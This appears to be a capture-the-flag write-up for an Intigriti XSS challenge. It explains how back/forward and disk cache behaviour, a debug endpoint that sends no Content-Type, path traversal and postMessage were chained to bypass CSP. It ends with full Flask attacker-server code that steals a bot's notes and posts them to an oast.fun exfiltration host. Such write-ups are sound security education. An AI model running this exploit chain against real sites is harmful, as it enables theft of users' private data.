**Flag:** `INTIGRITI{b4ckw4rD_f0rw4rd_c4ch3_x55_3h?}`

**Write-up:**

&tldr;
* Exploited stored XSS using backward forward cache
* CSP restricted inline XSS so chained two cached endpoints with attacker controlled contents to host a script and src attribute to point to the other.
* Exfiltrated the contents to the opened window using postMessage

Since the source code was available, I began reading the source code. I saw that the app is a nodejs application deployed via docker container.

Users can post notes in the application, and the idea is to exfiltrate the flag set inside a note created when we call /visit with a url that begins with http. The code in bot.js shows that after the flag is created, the browser instance navigates to the specified url. My first intuition was to search for schemas that begin with http and could execute js. However, I couldn't find any.

Probing the app, I made a few observations:
* If we have a note id, we can view the note. However, note id's are random, long, and generated using a secure library, so bruteforcing isn't possible.
* `/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id` endpoint was still in production. This endpoint unlike other endpoints such as `/note/:id` didn't set the `Content-Type` header.
* notes are stored twice, once in an object and in a map
* The map (notes) is only available via the `/notes` endpoint. All other endpoints use the object (`allPosts`) and make use of the helper function (`getPostByID`)
* the `/note/:id` endpoint renders a note title initially if no header named mode with value read is set. The contents of a note are loaded by a fetch call with a header (`mode: read`) to the same endpoint via a `view.js` script.
* Even though `view.js` script uses document.innerHTML, we can't exploit stored xss as it also uses DOMPurify.
* [`view.js` ](https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/static/challenge/view.js) gets the note id via url params.
* [`static app.js` ](https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/static/challenge/app.js) sets two window attributes when used. However, DOMClobberring is not possible as we use DOMPurify and even without DOMPurify, our stored payloads will be loaded last.
* CSP allowed inline css and scripts were restricted to self.
* URL const in [`app.js`](https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/app.js) is actually set to `challenge-0321.intigriti.com`. I found this out by making requests with varying origins and seeing cors succeeding only when the origin is `challenge-0321.intigriti.com`. 

Even with these observations, I couldn't find much to exploit, I tried searching for DOMPurify bypasses, checked whether the DOMPurify js file included was indeed the latest version by comparing checksums from the official DOMPurify website.

After the second hint was dropped by Intigriti, I found out about backward and forward cache.
The idea is that there are two types of cache employed in chrome: backward and forward cache and disk cache.
1. back/forward cache (bfcache)
* ref. https://web.dev/i18n/en/bfcache/
* It stores a complete snapshot of a page including the JavaScript heap.
* The cache is used for back/forward navigations.
* it has preference over disk cache
2. disk cache
* ref. https://www.chromium.org/developers/design-documents/network-stack/disk-cache/
* It stores a resource fetched from the web. The cache doesn't include the JavaScript heap.
* The cache is also used for back/forward navigations to skip communication costs.

When you visit a website, the page is cached, bfcache has preference over diskcache. fetch() api calls are also written to diskcache. This was important as in the `/note/:id` page, we render a note title, then `note.js` does a fetch that returns the contents that we save in a note. Thus caching it! So how can we exploit it? If we do a backward navigation to the `/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id` chrome would actually resolve it using the disk cache and just render it which can lead to xss. Bfcache has preference over diskcache. So we open a window via our website and pass that website for bot.js to visit it.

Hence after saving the payload to a note, trivially fetching the contents of `/notes` since it used session id, and sending the body contents to a oast server I control, I made a webserver that could do the below steps for me:
1. open `/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id`. This gets a 404 response invalidating the cache.
2. change the window's location to `note/some?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id`. Remember `view.js` in `/note:id` fetches the note using the url param id. It performs string concatination and by using ../ we can make it fetch from the debug endpoint so no `Content-Type` header is sent. The response is cached in the bfcache and diskcache.
3. navigate to attacker.com/go-back which has a script that does backward navigation (history.go(-1)) pushing our location back to `/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id`. Since the window.opener is present, disk cache is used and the resolved content leads to execution of our payload.

In between the steps I added a small delay to make sure the page is loaded completely.

But wait, the CSP prevents inline scripts. So we should host our script somewhere within the challenge site. We could host it inside another note and then resolve the note using the same backward/forward cache method.

And I tried it, it worked! But the problem arose again, CSP had default-src set to self. That means we can't exfiltrate the flag fetched by the payload (the payload actually fetched the note id that hosted the flag) to another domain. connect-src policy of the CSP fell back to default-src as it is not set and disallows connections to be made to external domains.

Then I resorted to use the postMessage API to exfiltrate content fetched by the payload to attacker.com (via window.opener) and send the message to my oast server from attacker.com (which I control the CSP of and haven't set any policies)

Putting it all together, I came up with the following PoC and exfiltrated the flag!
Side note, the code below shows the server I host on attacker.com. For ease of generation of notes, I leave a gen_payload page open which allows me operate quickly!

**PoC:**
Attacker controlled website: attacker.com, <*.oast.fun>
Attacker controlled endpoints in attacker.com: /, /go-back
Attacker controlled note ids: <note-id-1>, <note-id-2>

1. Send a request to /visit with url as attacker.com
2. See the flag end up in <*.oast.fun> (see attachment)
	
attacker.com does the following when visited
1. open a new window with url: http://127.0.0.1/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/<note-id-1>
2. wait for a second
3. change the window's location to http://127.0.0.1/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/<note-id-2>
4. wait for a second
5. change the window's location to http://127.0.0.1/note/some?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/<note-id-1>
6. wait for a second
7. change the window's location to http://127.0.0.1/note/some?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/<note-id-2>
8. wait for a second
9. change the window's location to http://attacker.com/go-back
	
attacker.com does the following when a postMessage is received:
sends the contents recieved to <*.oast.fun> via fetch api. (you will see cors error here, but the request is send, cors just prevents us from accessing the response)
	

attacker.com/go-back executes the following js code when visited:
history.go(-3);
	
this triggers the cached response (when visiting step 7) for the <note-id-2> which contains a script tag with src pointing to 
 http://127.0.0.1/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/<note-id-1>
	
<note-id-1> contains the js code to fetch http://127.0.0.1:80/notes and return the contents of the fetch request to the opener (attacker.com) via postMessage.

	
**Code for attacker.com:**
Forgive my f-string shenanigans.

```
from flask import Flask, request
import os

app = Flask(__name__)
BASE_URL = "http://127.0.0.1:80"
DEBUG_URL = "debug/52abd8b5-3add-4866-92fc-75d2b1ec1938"
exfil_server = "https://cfyrfan2vtc0000a195gg89c8icyyyyyb.oast.fun"

payload = """
const exec_payload = async function() {
"""+f"""
    var the_fetcher = await fetch('{BASE_URL}/notes');
    var the_contents = await the_fetcher.text();
    window.opener.postMessage(the_contents, '*');
"""+"""
};
exec_payload();
"""

@app.route("/gen_payload")
def start_page():
    return f"""
        <!DOCTYPE HTML>
        <html>
            <body>
                {payload}
                <form method='GET' action='/gen_payload_step1'>
                    <input type='text' name='payload_id' autocomplete='off'/>
                    <input type='submit' value='submit'/>
                </form>
            </body>
        </html>
    """

@app.route("/gen_payload_step1")
def step1():
    payload_id = request.args.get('payload_id')
    os.environ["payload_id"] = payload_id
    payload_host = f"&lt;script src='{BASE_URL}/{DEBUG_URL}/{payload_id}'>&lt;/script>"
    return f"""
        <!DOCTYPE HTML>
        <html>
            <body>
                {payload_host}
                <form method='GET' action='/attack'>
                    <input type='text' name='payload_host_id' value='' autocomplete='off'/>
                    <input type='submit' value='submit'/>
                </form>
            </body>
        </html>
    """

@app.route("/attack")
def attack():
    payload_id = os.environ["payload_id"]
    print(payload_id)
    hosting_id = request.args.get("payload_host_id")
    print(hosting_id)
    website_contents = """
document.write(window.location.href);
function sleep() {
    return new Promise(resolve => setTimeout(resolve, 1000));
}
window.addEventListener(
    'message',
    (event) => {
        console.log(event.data)
        fetch('"""+exfil_server+"""', {
            method: 'POST',
            body: event.data
        });
    },
    false
);
"""+f"""
var the_window = open('{BASE_URL}/{DEBUG_URL}/{payload_id}');
"""+"""
const start = async function() {
"""+f"""
    await sleep();
    the_window.location = '{BASE_URL}/{DEBUG_URL}/{hosting_id}';
    await sleep();
    the_window.location = '{BASE_URL}/note/some?id=../{DEBUG_URL}/{payload_id}';
    await sleep();
    the_window.location = '{BASE_URL}/note/some?id=../{DEBUG_URL}/{hosting_id}';
"""+"""
    await sleep();
    the_window.location = `${location.origin}/go-back`;
}
start();
    """
    return f"""
        <!DOCTYPE HTML>
        <html>
            <head>
                <title>Just a site</title>
            </head>
            <body>
                <script type='text/javascript'>
                {website_contents}
                </script>
            </body>
        </html>
    """

@app.route("/go-back")
def go_back():
    return "<!DOCTYPE HTML><html><body><script type='text/javascript'>console.log('hi');window.history.go(-3)</script></body></html>"

if __name__ == '__main__':
    app.run(debug=True)
```
